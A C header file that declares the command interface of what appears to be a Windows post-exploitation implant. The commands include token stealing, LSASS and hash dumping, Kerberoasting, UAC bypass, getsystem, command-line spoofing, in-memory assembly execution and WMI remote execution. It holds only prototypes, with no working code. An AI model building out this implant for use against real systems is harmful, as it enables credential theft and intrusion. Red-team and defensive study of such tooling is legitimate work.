#ifndef COMMANDS_H
#define COMMANDS_H

#include <stddef.h>

int cmd_shell(const char *cmdline, char *output_buf, size_t output_size);

int cmd_upload(const char *local_path, const char *data_b64,
               char *output_buf, size_t output_size);

int cmd_download(const char *local_path, char *output_buf, size_t output_size);

int cmd_sysinfo(char *output_buf, size_t output_size);

int cmd_ps(char *output_buf, size_t output_size);
int cmd_getpid(const char *name, char *output_buf, size_t output_size);

int cmd_spawn(const char *exe_path, const char *fake_cmdline,
              const char *real_cmdline,
              char *output_buf, size_t output_size);

int cmd_getuid(char *output_buf, size_t output_size);
int cmd_steal_token(unsigned long pid, char *output_buf, size_t output_size);
int cmd_rev2self(char *output_buf, size_t output_size);
int cmd_make_token(const char *domain_user, const char *password,
                   char *output_buf, size_t output_size);

int cmd_privs(const char *action, const char *priv_name,
              char *output_buf, size_t output_size);

int cmd_screenshot(char *output_buf, size_t output_size);

int cmd_execasm(const unsigned char *asm_bytes, size_t asm_len,
                const char *args_str,
                char *output_buf, size_t output_size);

int cmd_lsassdump(const char *out_path, char *output_buf, size_t output_size);

int cmd_hashdump(const char *dir, char *output_buf, size_t output_size);

int cmd_portscan(const char *host, unsigned short start, unsigned short end,
                 int timeout_ms, char *output_buf, size_t output_size);

int cmd_ls(const char *path, char *output_buf, size_t output_size);
int cmd_mkdir(const char *path, char *output_buf, size_t output_size);
int cmd_rm(const char *path, char *output_buf, size_t output_size);
int cmd_cp(const char *src, const char *dst, char *output_buf, size_t output_size);
int cmd_mv(const char *src, const char *dst, char *output_buf, size_t output_size);

int cmd_wmiexec(const char *host, const char *cmdline,
                char *output_buf, size_t output_size);

int cmd_kerberoast(const char *args, char *output_buf, size_t output_size);
int cmd_asreproast(const char *args, char *output_buf, size_t output_size);

int cmd_uacbypass(const char *args, char *output_buf, size_t output_size);
int cmd_privesc(char *output_buf, size_t output_size);

int cmd_getsystem(const char *args, char *output_buf, size_t output_size);
int cmd_lpe_check(const char *args, char *output_buf, size_t output_size);

int cmd_reg_query(const char *keypath, const char *valname,
                  char *output_buf, size_t output_size);
int cmd_reg_set(const char *keypath, const char *valname,
                const char *type_str, const char *value,
                char *output_buf, size_t output_size);
int cmd_reg_delete(const char *keypath, const char *valname,
                   char *output_buf, size_t output_size);

#endif /* COMMANDS_H */
